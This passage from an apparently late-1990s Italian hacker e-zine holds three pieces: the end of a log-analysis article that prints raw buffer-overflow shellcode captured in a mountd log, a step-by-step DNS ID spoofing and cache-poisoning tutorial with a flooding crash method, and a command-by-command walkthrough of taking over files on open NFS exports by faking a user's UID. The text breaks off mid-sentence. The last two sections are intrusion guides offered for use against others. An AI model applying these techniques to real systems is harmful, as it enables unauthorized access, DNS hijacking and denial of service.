Jun 9 10:43:14 EDT 1998) ready.

Come puoi vedere sopra, una connessione completa e' stata fatta per
determinare la versione del wu-ftpd che gira. Quando vedi connessioni complete
nei tuoi log, come sopra, sei stato sicuramente scannerizzato da uno strumento
in cerca di exploit.

Nmap , come la maggior parte dei portscan, non guarda cosa gira sulla porta,
ma se tu fai girare dei servizi specifici. Per questo nmap ha un grande set di
opzioni, di settaggi, facendoti decidere che tipo di connessioni effettuare,
incluse SYN, FIN, Xmas, Null, etc. Per una dettagliata descrizine di queste
opzioni guardate  http://www.insecure.org/nmap/nmap_doc.html. A causa di
queste opzioni i tuoi log saranno differenti a seconda delle opzioni
selezionate dall'utente remoto che usa nmap. Una connessione fatta con
l'opzione -sT e' una connessione completa, cosi' i log saranno simili a quelli
di sscan. Di default nmap scannerizza piu' porte.

/var/log/secure 
Apr 14 21:20:50 mozart in.rlogind[11706]: connect from 192.168.11.200 
Apr 14 21:20:51 mozart in.fingerd[11708]: connect from 192.168.11.200 
Apr 14 21:20:51 mozart ipop2d[11709]: connect from 192.168.11.200 
Apr 14 21:20:51 mozart in.rshd[11710]: connect from 192.168.11.200 
Apr 14 21:20:51 mozart gn[11711]: connect from 192.168.11.200 
Apr 14 21:20:51 mozart gn[11711]: error: cannot execute /usr/sbin/gn: No such
file or directory
Apr 14 21:20:52 mozart in.timed[11712]: connect from 192.168.11.200 
Apr 14 21:20:52 mozart imapd[11713]: connect from 192.168.11.200 
Apr 14 21:20:52 mozart ipop3d[11714]: connect from 192.168.11.200 
Apr 14 21:20:52 mozart in.telnetd[11715]: connect from 192.168.11.200 
Apr 14 21:20:52 mozart in.ftpd[11716]: connect from 192.168.11.200 

Una cosa da tenere a mente e' l'opzione -D (o decoy). Questa opzione di nmap
permette all'user di spoofare il proprio ip. Potresti vedere scanning fatto
da 15 ip differenti allo stesso tempo, ma solo uno di questi e' quello reale.
E' veramente difficile determinare quale di questi 15 sia quello vero. Piu'
spesso l'user usera' l'opzione -sS per il port scanning. E' una opzione piu'
nascosta, e' mandato un solo pacchetto SYN, se il sistema remoto risponde,
la connessione e' immediatamente chiusa con un RST. I log di uno scan del
genere sono piu' o meno cosi' (Sono inclusi solo i primi 5 tentativi)

/var/log/secure 
Apr 14 21:25:08 mozart in.rshd[11717]: warning: can't get client address:
Connection reset by peer
Apr 14 21:25:08 mozart in.rshd[11717]: connect from unknown 
Apr 14 21:25:09 mozart in.timed[11718]: warning: can't get client address:
Connection reset by peer
Apr 14 21:25:09 mozart in.timed[11718]: connect from unknown 
Apr 14 21:25:09 mozart imapd[11719]: warning: can't get client address:
Connection reset by peer
Apr 14 21:25:09 mozart imapd[11719]: connect from unknown 
Apr 14 21:25:09 mozart ipop3d[11720]: warning: can't get client address:
Connection reset by peer
Apr 14 21:25:09 mozart ipop3d[11720]: connect from unknown 
Apr 14 21:25:09 mozart in.rlogind[11722]: warning: can't get client address:
Connection reset by peer
Apr 14 21:25:09 mozart in.rlogind[11722]: connect from unknown 
  
Nota tutti gli errori nelle connessioni. Quando la sequenza SYN-ACK smette
prima che risca una connessione completa, il demone non puo' determinare
l'indirizzo del sistema che scannerizza. Il log mostra che hai subito uno
scan, ma non puoi sapere da chi.
La cosa piu' allarmante e' che ,anche nei piu' recenti kernel, nessuno di
questi errori e' loggato.
Nmap include altre opzioni che rendono la connessione "ambigua", come -sF,
-sX, -sN ... ecco come appare il log con queste opzioni:

/var/log/secure                                                         
  
Nota qualcosa qui: NESSUN LOG! Bello vero? :p Sei stato scannerizato e non lo
sai. Tutti e tre i tipi di scan hanno lo stesso risultato , sfortunatamente
tu puoi loggare solo il primo tipo (-sT , la connessione completa). Per
loggare questo tipo di scan devi usare delle differenti applicazioni , come
ad esempio tcplogd, scanlogd,ippl. Alcuni firewall in commercio trovano
persino questo tipo di scan (Checkpoint Firewall 1)

4.Hanno avuto accesso?                                                          

Una volta appurato che hai subito un portscan e perche', la domanda successiva
che potresti farti e' "sono dentro? Hanno avuto accesso al mio sistema?" .
La maggior parte degli exploit remoti di oggi sono basati su buffer overflows
(coosciuti anche come smashing the stack). Detto in parole povere un buffer
overflow e' quando un programma (normalmente un demone) riceve piu' input di
quanti se ne aspetti, quindi riscrive in zone critiche dell'area di memoria.
Quindi e' eseguito un certo codice, che da accesso root. Per maggiori
informazioni sul buffer overflow:
ftp://ftp.technotronic.com/rfc/phrack49-14.txt.

Puoi normalmente identificare gli attacchi di buffer overflow in
/var/log/messages (o /var/adm/messages) come ad esempio per l'attacco come
quello per mountd. Vedrai attacchi simili anche in maillog per attacchi contro
imapd. Un attacco per buffer overflow si presenta cosi':

Apr 14 04:20:51 mozart mountd[6688]: Unauthorized access by NFS client
192.168.11.200.

Apr 14 04:20:51 mozart syslogd: Cannot glue message parts together
Apr 14 04:20:51 mozart mountd[6688]: Blocked attempt of 192.168.11.200 to
mount
~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~ 
P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~ 
P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~ 
P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~ 
P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~ 
P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~ 
P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~ 
P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~ 
P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~ 
P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~ 
P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~ 
P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~ 
P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~ 
P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~ 
P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~ 
P~P~P3Û3À&deg;^[Í~@3Ò3À~KÚ&deg;^FÍ~@þÂuô1À&deg;^BÍ~@~EÀubëb^V&not;<ýt^FþÀt^Këõ&deg;0þÈ~HFÿëì^&deg;^B~ 
I^FþÈ~IF^D&deg;^F~IF^H&deg;f1ÛþÃ~IñÍ~@~I^F&deg;^Bf~IF^L&deg;*f~IF^N~MF^L~IF^D1À~IF^P&deg;^P~IF^H&deg; 
fþÃÍ~@&deg;^A~IF^D&deg;f&sup3;^DÍ~@ë^DëLëR1À~IF^D~IF^H&deg;fþÃÍ~@~HÃ&deg;?1ÉÍ~@&deg;?þÁÍ~@&deg;?þÁÍ~@&cedil;.bin@~ 
I^F&cedil;.sh!@~IF^D1À~HF^G~Iv^H~IF^L&deg;^K~Ió~MN^H~MV^LÍ~@1À&deg;^A1ÛÍ~@èEÿÿÿÿýÿPrivet 
ADMcrew~P(-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(Apr 14 04:20:51 
mozart ^H(-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(-^ 
E^H(-^E^H-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(-^E 
^H(-^E^H-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(-^E^ H(-^E^H(-^E^H(-^E^H(-^E^H(-^E^H(-^E 
^H(-^E^H(-^E 
  
Quando vedi qualcosa del genere nei tuoi log files, qualcuno ha tentato di
exploitare il tuo sistema. E' difficile determinare se l'exploit ha avuto
successo. Un modo indiretto per farlo pero' e'guardare se ci sono connessioni
ambigue sul tuo sistema. Se l'exploit ha funzionato ed hanno eseguito un
corretto login allora sono dentro. Un altro modo e' di guardare nel tuo
/etc/passwd account tipo "moof" o "w0rm"...questi account (uid 0) sono
aggiunti da alcuni dei piu' comuni exploit. La prima cosa che i "bravi
ragazzi" fanno, dopo aver avuto accesso al sistema e' manomettere i tuoi log
e alterare gli stessi programmi che loggano sul tuo sistema. Da questo punto
in poi ogni cosa sul tuo computer e' compromessa. Cosa fare a questo punto e'
oggetto di un altro articolo. Fino ad allora suggerisco di dare una occhiata
a http://www.cert.org/nav/recovering.html

Per aiutarmi a trovare anomalie nei miei file di log, ho creato degli script
che mi aiutino a controllarli.
http://www.enteract.com/~lspitz/bash.txt
http://www.enteract.com/~lspitz/ksh.txt
 
Conclusione
I tuoi log di sistema possono dirti un sacco di cose sul tuo nemico. In
qualunque caso il primo passo e' garantire l'integrita' dei tuoi file di log.
Uno dei migliori modi per farlo e' usare un server remoto di log che riceve e
conserva i log da tutti i sistemi. Una volta fatto questo, tu puoi
identificare schemi nei tuoi file di log. Basandoti su questi pattern, schemi
precisi, puoi determinare cosa sta cercando il "bravo ragazzo"  e
potenzialmente quali strumenti stiano usando. Basandoti su queste conoscenze ,
puoi tenere al sicuro e proteggere il tuo sistema al meglio.

                                              \think\ - 2cool4this@excite.com
                            
[############################################################################]

                  -----------------------------------
                        HACKING DELL'ID DEL DNS
                  -----------------------------------                         

--[1]-- Presentazione dell'Hacking dell'ID del DNS

Salve gente ora vi spiego cos'e' l'hacking dell'ID del DNS (o Spoofing).
L'hacking dell'ID del DNS non e' uno dei soliti metodi di fare
hacking/spoofing come con jizz o erect. Questo metodo e' basato su una
vulnerabilita' del protocollo DNS.
Molto brutale, l'hack dell'ID del DNS e' molto efficiente e forte visto
che nessuna generazione di demoni DNS puo' sfuggire (persino WinNt).


--[1.1]-- Spiegazione del meccanismo del protocollo DNS 

Come primo passo, dovete conoscere come lavora il DNS. Vi spieghero' solo
i fattori piu' importanti di questi protocollo. Per farlo con ordine,
seguiranno i modi di un pacchetto di richiesta DNS dalla A alla Z!

1: il client (bla.bibi.com) manda una richiesta di risoluzione del dominio
"www.heike.com". Per risolvere il nome, bla.bibi.com usa "dns.bibi.com" per
il DNS. Andiamo a guardare la seguente figura:

/---------------------------------\
| 111.1.2.123  =  bla.bibi.com    |
| 111.1.2.222  =  dns.bibi.com    |
| formato                         |
| IP_ADDR:PORT->IP_ADDR:PORT      |
| es:                             |
| 111.1.2.123:2999->111.1.2.222:53|
\---------------------------------/
...
  gethosbyname("www.heike.com");
...

[bla.bibi.com]                             [dns.bibi.com] 
111.1.2.123:1999 --->[?www.heike.com]------> 111.1.2.222:53

Qui vediamo la nostra richiesta di risoluzione dalla porta sorgente 1999 che
sta chiedendo al dns sulla porta 53.

[nota: DNS e' sempre sulla porta 53]

Ora che dns.bibi.com ha ricevuto la richiesta di risoluzione da bla.bibi.com,
dns.bibi.com dovra' risolvere il nome, andiamo a vedere...

[dns.bibi.com]                         [ns.internic.net]
111.1.2.222:53 -------->[dns?www.heike.com]----> 198.41.0.4:53

dns.bibi.com chiede a ns.internic.net qual'e' il nome root del server con
l'indirizzo www.heike.com, o se non ce l'ha e manda la richiesta ad un name
server che ha l'autorizazzione sui domini '.com'.

[nota: domandiamo ad internic perche' potrebbe avere questa richiesta nella
sua cache]

[ns.internic.net]                                      [ns.bibi.com]
198.41.0.4:53 ------>[ns for.com is 144.44.44.4]------> 111.1.2.222:53

Qui possiamo vedere che ns.internic.net ha risposto a ns.bibi.com
(che e' il DNS che ha l'autorizzazzione sul dominio bibi.com)
e che il name server di for.com ha l'IP 144.44.44.4 [chiamato ns.for.com].
Ora il nostro ns.bibi.com domandera' a ns.for.com l'indirizzo di www.heike.com
ma questo non lo ha e deviera' la richiesta al DNS di heike.com che ha
autorita' per heike.com.

[ns.bibi.com]                              [ns.for.com]
111.1.2.222:53 ------>[?www.heike.com]-----> 144.44.44.4:53

risposta da ns.for.com

[ns.for.com]                                              [ns.bibi.com]
144.44.44.4:53 ------>[ns for heike.com is 31.33.7.4]---> 144.44.44.4:53

Ora che conosciamo quale indirizzo IP ha autorita' sul dominio "heike.com"
[lo chiameremo ns.heike.com], gli domandiamo qual'e' l'IP della macchina www.

[www.heike.com poi :)].

[ns.bibi.com]                              [ns.heike.com]
111.1.2.222:53 ----->[?www.heike.com]----> 31.33.7.4:53

Ed ora potremo finalmente avere a nostra risposta!!

[ns.heike.com]                                           [ns.bibi.com]
31.33.7.4:53 ------->[www.heike.com == 31.33.7.44] ----> 111.1.2.222:53

Abbiamo la risposta, possiamo deviarla al nostro client bla.bibi.com.

[ns.bibi.com]                                             [bla.bibi.com]
111.1.2.222:53 ------->[www.heike.com == 31.33.7.44]----> 111.1.2.123:1999

Eheh, ora bla.bibi.com conosce l'IP di www.heike.com :)

Quindi.. ora immaginiamo che desideriamo avere il nome di una macchina dal suo
IP, per farlo con ordine, i modi per farlo sono differenti perche' l'IP
deve essere trasformato:

esempio: 

100.20.40.3 diventera' 3.40.20.100.in-addr.arpa

Attenzione! Questo metodo e' solo per la richiesta di risoluzione IP, chiamato
DNS reverse.

Quindi vediamo in pratica quando prendiamo l'IP di www.heike.com (31.33.7.44
o "44.7.33.31.in-addr.arpa" dopo la traduzione in un formato comprensibile 
del DNS).

...
   gethostbyaddr("31.33.7.44");
...

[bla.bibi.com]                                          [ns.bibi.com]
111.1.2.123:2600 ----->[?44.7.33.31.in-addr.arpa]-----> 111.1.2.222:53

Spediamo la nostra richiesta a ns.bibi.com

[ns.bibi.com]                                          [ns.internic.net]
111.1.2.222:53 ----->[?44.7.33.31.in-addr.arpa]------> 198.41.0.4:53 

ns.internic.net spedira' l'IP del name server che ha autorita' su
'31.in-addr.arpa'.

[ns.internic.net]                                             [ns.bibi.com]
198.41.0.4:53 --> [DNS per 31.in-addr.arpa e' 144.44.44.4] -> 111.1.2.222:53

Ora ns.bibi.com richiedera' la stessa domanda del DNS a 144.44.44.4.

[ns.bibi.com]                                          [ns.for.com]
111.1.2.222:53 ----->[?44.7.33.31.in-addr.arpa]------> 144.44.44.4:53

e cosi' via...
In pratica il meccanismo e' vicino lo stesso usato per la risoluzione del nome

Penso che abbiate capito come dialoga il DNS. Ora andiamo a studiarci il
formato dei messaggi DNS.


--[1.2]-- Pacchetti DNS 

Questo e' il formato di un messaggio DNS  :

    +---------------------------+---------------------------+
    |     ID (il famoso :)      |  flags                    |
    +---------------------------+---------------------------+
    |   numeri di domande       | numeri di risposte        |
    +---------------------------+---------------------------+
    | numeri di RR autoritari   |numero di RR supplementari |
    +---------------------------+---------------------------+
    |                                                       |
    \                                                       \
    \                   DOMANDE                             \
    |                                                       |
    +-------------------------------------------------------+
    |                                                       |
    \                                                       \
    \                   RISPOSTE                            \
    |                                                       |
    +-------------------------------------------------------+
    |                                                       |
    \                                                       \
    \                  Altre cose meno importanti           \
    |                                                       |
    +-------------------------------------------------------+


--[1.3]--  Struttura di un pacchetto DNS.

__ID__

L' ID permette di identificare ogni pacchetto DNS, poiche' gli scambi tra name
servers sono dalla porta 53 alla porta 53, e in molti casi le richieste
possono essere piu' di una, cosi' l'ID e' l'unico metodo di distinguere le
differenti richieste DNS. Bene parlero' di esse dopo...

__flags__

L'area dei flags e' divisa in molte parti :

       4 bits                    3 bits (sempre 0)
       |                         |
       |                         |
[QR | opcode | AA| TC| RD| RA | zero | rcode ]
                                         |
 |           |__|__|__|                  |______ 4 bits
 |                    |_ 1 bit
 |
1 bit

QR     = Se il bit QR = 0, significa che il pacchetto e' una domanda,
         altrimenti e' una risposta.
 
opcode = Assume valore 0 per le richieste normali, 1 per richieste riservate,
         e 2 per richieste di stato (non abbiamo bisogno di conoscerli tutti).

AA     = Se e' = 1, significa che il name server ha una risposta autorizzata.

TC     = Non importa

RD     = Se e' = 1, significa "Richiesta Recursiva", per esempio quando
         bla.bibi.com chiede a ns.bibi.com di risolvere il nome, il flag
         dice al DNS di assumere questa richiesta.

RA     = Se e' = 1, significa che la recursione e' disponibile.
         Questo bit e' settato a 1 nella risposta di un name server se esso
         supporta le recursioni.
 
Zero   = Questi sono tre zeri...
 
rcode  = Contiene il ritorno del messaggio d'errore delle richieste
         se = 0, significa "nessun errore", 3 significa "errore del nome"
 
I 2 flags seguenti non hanno importanza per noi.
 
DOMANDA DNS:
 
Ecco il formato di una domanda DNS :
 
+-----------------------------------------------------------------------+
|                        nome della domanda                             |
+-----------------------------------------------------------------------+
|       tipo di domanda          |      tipo di query                   |
+--------------------------------+--------------------------------------+

La struttura della domanda e' come questa

esempio:

www.heike.com  sara' [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0] 

per un indirizzo IP e' la stessa cosa

44.33.88.123.in-addr.arpa diventera':

[2|4|4|2|3|3|2|8|8|3|1|2|3|7|i|n|-|a|d|d|r|4|a|r|p|a|0]

[nota]: esiste un formato di compressione, ma non lo useremo.


tipo di domanda:

 Questi sono i valori che useremo molte volte:

 [nota]: Ci sono piu' di 20 tipi differenti di valori e mi stufo di
         scriverli :))

  name    value

   A    |   1    | Indirizzo IP        ( risolve un nome in un IP )
   PTR  |   12   | Puntatore           ( risolve un IP in un nome )

tipo di query:

 I valori sono gli stessi del tipo di domanda.
 (non so se e' vero, ma non punto ad impararvi dalla A alla Z il protocollo
  DNS, per esso potreste riferirvi alla RFC da 1033 a 1035 e 1037,
  io miro a darvi una conoscenza globale in modo da sperimentarla in pratica!)

RISPOSTE DNS:

Le risposte hanno un formato che chiamiamo RR, ma non ricordo perche' :)

Ecco il formato di una risposta (una RR)

+------------------------------------------------------------------------+
|      nome del dominio                                                  |
+------------------------------------------------------------------------+
|   tipo                           |    classe                           |
+----------------------------------+-------------------------------------+
|                           TTL (tempo da vivere)                        |
+------------------------------------------------------------------------+
| lunghezza dei dati sorgenti|                                           |
|----------------------------+                                           |
|                       dati sorgenti                                    |
+-------------------------------------------------------------------------

nome del dominio:

Il nome del dominio contiene il seguente :
Il nome del dominio e' memorizzato alla stesso modo delle domande per la
risoluzione di richiesta di www.heike.com, il flag "nome del dominio"
conterra'  [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0]

tipo:

Il flag tipo e' lo stesso di "tipo di query" di un pacchetto domanda. 

classe:

Il flag classe e' uguale a 1 per i dati su internet.

tempo da vivere:

Questo flag esprime in secondi il tempo da vivere dell'informazione nella
cache del name server.

lunghezza dei dati sorgenti: 

La lunghezza dei dati sorgenti, per esempio se e' = 4, significa che i dati
sorgenti sono grandi 4 byte.

dati sorgenti:  

qui mettiamo l'IP per esempio 

Vi offro un piccolo esempio che vi spiega questo

Ecco cosa succede quando ns.bibi.com chiede a ns.heike.com l'indirizzo di
www.heike.com

ns.bibi.com:53 ---> [?www.heike.com] ----> ns.heike.com:53 

+---------------------------------+--------------------------------------+
|   ID = 1999                     | QR = 0 opcode = 0 RD = 1             |
+---------------------------------+--------------------------------------+
| numero di domande = htons(1)    | numero di risposte = 0               |
+---------------------------------+--------------------------------------+
| numeri di RR authoritari = 0    | numero di RR supplementari = 0       |
+---------------------------------+--------------------------------------+
<la parte domanda>
+------------------------------------------------------------------------+
|   nome della domanda = [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0]                 |
+------------------------------------------------------------------------+
|  tipp della domanda = htons(1)  |      tipo di query=htons(1)          |
+---------------------------------+--------------------------------------+

questo e' per la domanda.

ora andiamo a vedere la risposta di ns.heike.com

ns.heike.com:53 -->[IP di www.heike.com e' 31.33.7.44] --> ns.bibi.com:53

+------------------------------------+---------------------------------------+
|   ID = 1999                        | QR=1 opcode=0 RD=1  AA =1  RA=1       |
+------------------------------------+---------------------------------------+
| numero di domande = htons(1)       | numero di risposte = htons(1)         |
+------------------------------------+---------------------------------------+
| numero di RR autoritari = 0        | numero di RR supplementari = 0        |
+------------------------------------+---------------------------------------+
+----------------------------------------------------------------------------+
|   nome della domanda = [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0]                     |
+----------------------------------------------------------------------------+
|   tipo di domanda = htons(1)       |   tipo di query = htons(1)            |
+----------------------------------------------------------------------------+
+----------------------------------------------------------------------------+
|   nome del dominio = [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0]                       |
+----------------------------------------------------------------------------+
|       tipo        = htons(1)       |      classe   = htons(1)              |
+----------------------------------------------------------------------------+
|                       tempo da vivere = 999999                             |
+----------------------------------------------------------------------------+
| lunghezza dati sorgenti = htons(4) | dati sorgenti=inet_addr("31.33.7.44") |
+----------------------------------------------------------------------------+

Yeah, questo e' tutto per ora!

Ecco l'analisi:

Nella risposta QR = 1 perche e' una risposta :)
AA = 1 perche il name server ha autorita' sul suo dominio
RA = 1 perche' la recursione e' disponibile

Benone =) Penso che abbiate imparato le basi per i prossimi eventi.

--[2.0]-- DNS ID hack/spoof

E' venuta l'ora di spiegarvi chiaramente cos'e' l'hacking/spoofing dell'ID DNS
Come ho spiegato prima, l'unico metodo per il demone DNS di riconoscere le
differenti domande/risposte e' il flag ID nel pacchetto. Guardate questo
esempio:

ns.bibi.com;53 ----->[?www.heike.com] ------> ns.heike.com:53

Cosi' dovete solo spoffare l'ip di ns.heike.com e rispondere con informazioni
false prima di ns.heike.com a ns.bibi.com!

ns.bibi.com <------- . . . . . . . . . . .  ns.heike.com 
                   |
                   |<--[IP per www.heike.com e' 1.2.3.4]<-- hum.roxor.com 

Ma in pratica avete da indovinare un buon ID :) Se siete su una LAN, potete
sniffare per prendere questo ID e rispondere prima al name server
(e' facile sui network locali )

Se volete far cio' da remoto, non avete molte scelte, avrete solo 4 metodi di
base:
     
1.) Testare in modalita' random tutti i possibili valori del flag ID.
    Dovete prima rispondere al ns ! (ns.heike.com in questo metodo).
    Questo metodo e' obsoleto finche' volete conoscere l'ID o un'altra
    condizione favorevole alla sua predizione.

2.) Spedite qualche richiesta DNS (200 o 300) in ordine per incrementare le
    possibilita' di caduta su un buono ID.

3.) Flooddate il DNS in modo da evitare il suo lavoro. Il name server
    crashera' e mostrera' il seguente errore!

    >> Oct 06 05:18:12 ADM named[1913]: db_free: DB_F_ACTIVE set - ABORT
       ora il demone named e' fuori servizio :)

  4.) O potete usare le vulnerabilita'in BIND scoperte dalla SNI (Secure
      Networks, Inc.) con la predizione dell'ID .  


---------------------- Vulnerabilita' dell'ID di Windows ---------------------

Ho scovato delle pesanti vulnerabilita' in Win95 , immagino i miei amici che
l'hanno.  L'ID di Windows e' estremamente facile da predire perche' e' "1"
di default :))) e "2" per la seconda domanda (se ci sono 2 richieste insieme).
 

---------------------- Vulnerabilita' di BIND --------------------------------
 
C'e' una vulnerabilita' in BIND. 
Infatti, l'ID del DNS e' facile da predirre, vi rimane solo sniffare un DNS
in modo da fare quello che volete. Andiamo a spiegarci...

IL DNS usa un ID random all'inizio ma incrementa quell'ID solo  per la
prossima domanda... =)))

E' facile da exploitare questa vulnerabilita'
Ecco il modo:

1. Sniffate facilmente i messaggi che arrivano ad un DNS random (es.
   ns.dede.com per questo esempio).

2. Chiedi a NS.victim.com di risolvere (random).dede.com. NS.victim.com
   chiedera' a ns.dede.com di risolvere (random).dede.com

   ns.victim.com ---> [?(rand).dede.com ID = 444] ---> ns.dede.com

3. Ora avete l'ID del messaggio da NS.victim.com, conoscete quale area ID
   dovrete usare. (ID = 444 in questo esempio).

4. Poi costruite la vostra richiesta di risoluzione es. www.microsoft.com a
   NS.victim.com

   (voi) ---> [?www.microsoft.com] ---> ns.victim.com

   ns.victim.com --> [?www.microsoft.com ID = 446 ] --> ns.microsoft.com

5. Flooddate il name server ns.victim.com con l'ID (444) che avete gia' e
   incrementate quest'ultimo.

 ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 444] --> ns.victim.com
 ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 445] --> ns.victim.com
 ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 446] --> ns.victim.com
 ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 447] --> ns.victim.com
 ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 448] --> ns.victim.com
 ns.microsoft.com --> [www.microsoft.com = 1.1.1.1 ID = 449] --> ns.victim.com

(ora sapete che gli ID del DNS si possono indovinare, e si possono solo
incrementare. Floddate ns.victim.com con le risposte spoffate con l'ID 444+ ;)

C'e' un altro metodo di exploitare questa vulnerabilita' senza il root su ogni
DNS.

Il meccanismo e' veramente semplice. Ecco la spiegazione:

Spediamo a ns.victim.com una richiesta di risoluzione per *.provnet.fr

(voi) ----------[?(random).provnet.fr] -------> ns.victim.com

Poi, ns.victim.com chiede a ns1.provnet.fr di risolvere (random).provnet.fr.
Non c'e' niente di nuovo qui, ma la parte interessante inizia qui.

Da questo punto iniziate a floodare ns.victim.com con risposte spoofate 
(con ns1.provnet.fr IP) con id da 100 a 110...

(spoof) ----[(random).provnet.fr is 1.2.3.4 ID=100] --> ns.victim.com 
(spoof) ----[(random).provnet.fr is 1.2.3.4 ID=101] --> ns.victim.com 
(spoof) ----[(random).provnet.fr is 1.2.3.4 ID=102] --> ns.victim.com 
(spoof) ----[(random).provnet.fr is 1.2.3.4 ID=103] --> ns.victim.com 
.....

Dopo cio', chiediamo a ns.victim.com se (random).provnet.fr ha un IP.

Se ns.victim.com ci da' un IP per (random).provnet.fr poi abbiamo trovato il
corretto ID. Altrimenti dobbiamo ripetere questo attacco finche' troviamo
l'ID. E' un po' lungo ma e' effettivo. E niente ci permette di non farlo
con i nostri amici. Byez all!

                                                                    T0rment0

[############################################################################]

                   ----------------------------------
                         PIU' IMPORT CHE EXPORT 
                   ----------------------------------

Questo e' uno dei tanti metodi per entrare in un sistema.
Come saprete molti server su internet hanno delle directory exportabili
ovvero delle directory che possono essere montate da chiunque sul proprio
linux box. E' stato creato con lo scopo di rendere condivisibile alcuni dati
con gli altri utenti credendo che sulla terra esistevano persone in grado
di utilizzarlo, pero' i creatori si sono dovuti ricredere quando hanno visto
che vi sono dei sysadmin cosi' deficienti da rendere la directory /
esportabile. Ora come dimostrazione, prendiamo in cosiderazione il server
cazz.or.jp (non esiste). Dimenticavo di dirvi che dovrete essere root su
una qualsiasi macchina (anche la vostra) perche' dopo dovrete modificare il
file delle password.

Per vedere se ci sono drive mountabili usiamo l'utility showmount:

[T0rment0@/root]# showmount -e cazz.or.jp
Export list for cazz.or.jp:
/usr/local                                       cazzus.cazz.or.jp
/export/home                                     (everyone)
/export/linux                                    (everyone)

Ora la scritta (everyone) significa che tutti possono accedervi e guarda un
po', c'e' anche la directory home. Ihih!

Possiamo iniziare a montare il drive.
Per procedere useremo l'utility mount in questo modo:

[T0rment0@/root]# mkdir /mnt/mount
[T0rment0@/root]# mount -nt nfs domain.com:/export/home /mnt/mount

Abbiamo prima creato una directory apposita, poi lo abbiamo montato.

Mentre per smontare il filesystem remoto basta che facciate:

[T0rment0@/root]# umount /mnt/mount

Ok. Questa volta e'per davvero:

prima cosa andiamo nella directory montata e digitiamo ls -l

[T0rment0@/root]# cd /mnt/mount
[T0rment0@/mnt/mount]# ls -l

drwxr-xr-x  11 342      other        2048 Mar  1 10:25 milena
drwxr-xr-x   2 345      other         512 Oct 15 07:45 kitana
drwxr-xr-x   2 507      other         512 Feb  8 13:00 scorpion
drwxr-xr-x   2 mandrake other         512 Sep 27 06:15 subzero
drwxr-xr-x   6 news     news          512 Mar  6  1996 news
drwxr-xr-x   2 320      other         512 Jan 24 04:17 cyrax
drwxr-xr-x   4 coj      other         512 Sep 27 06:16 raiden
drwxr-xr-x   2 318      other         512 Mar  1 10:10 jax
drwxr-xr-x   5 435      daemon        512 Jan 26  1996 lynx

Da come si denota, jax e' l'utente #318, quindi basta che andiamo a modificare
il nostro file delle password settando quanto segue:

[T0rment0@/mnt/mount]# pico /etc/passwd 
jax:x:3182:2::/home:/bin/bash

Ora facciamo su sull'account jax e poi digitiamo ls -l per vedere se e'
cambiato qualcosa:

[T0rment0@/mnt/mount]# su - jax 
[T0rment0@/mnt/mount]$ ls -l
total 18
drwxr-xr-x  11 342      other        2048 Mar  1 10:25 milena
drwxr-xr-x   2 345      other         512 Oct 15 07:45 kitana
drwxr-xr-x   2 507      other         512 Feb  8 13:00 scorpion
drwxr-xr-x   2 mandrake other         512 Sep 27 06:15 subzero
drwxr-xr-x   6 news     news          512 Mar  6  1996 news
drwxr-xr-x   2 320      other         512 Jan 24 04:17 cyrax
drwxr-xr-x   4 coj      other         512 Sep 27 06:16 raiden
drwxr-xr-x   2 jax      other         512 Mar  1 10:10 jax
drwxr-xr-x   5 435      daemon        512 Jan 26  1996 lynx

Se siete arguti noterete che il numero utente di jax e' scomparso quindi ora
siamo padroni della directory. Ora per avere accesso sulla macchina con
